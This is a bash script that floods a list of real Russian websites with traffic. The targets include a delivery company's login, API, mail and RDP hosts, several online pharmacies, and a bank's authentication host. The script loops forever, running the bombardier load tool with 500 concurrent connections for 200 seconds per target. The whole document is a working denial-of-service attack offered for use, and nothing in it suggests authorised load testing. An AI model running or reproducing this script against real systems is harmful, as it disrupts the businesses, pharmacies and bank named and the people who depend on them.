#!/bin/bash -x

DESTS=(
"https://cdek.ru"
"https://lk.cdek.ru/user/login"
"https://api.cdek.ru"
"https://global.cdek.ru"
"https://izusa.cdek.ru"
"https://mx12.cdek.ru"
"https://jira8.cdek.ru"
"https://mx3.cdek.ru"
"https://mx13.cdek.ru"
"https://rdp.msk.cdek.ru"
"https://mail.global.cdek.ru"
"https://static.cdek.ru"
"ns3.cdek.ru"
"ns1.cdek.ru"

"https://www.eapteka.ru"
"https://www.asna.ru/"
"https://366.ru"
"https://stolichki.ru"
"https://aptekamos.ru"
"https://vseapteki.ru"
"https://www.rigla.ru"
"https://planetazdorovo.ru"
"https://samson-pharma.ru"
"https://zdorov.ru"
"https://apteka.ru"
"auth.tcsbank.ru"
)

while true; do
    for DEST in ${DESTS[@]}; do
        sudo docker run -t --rm alpine/bombardier -c 500 -d 200s -l $DEST
        sleep 1
    done
done
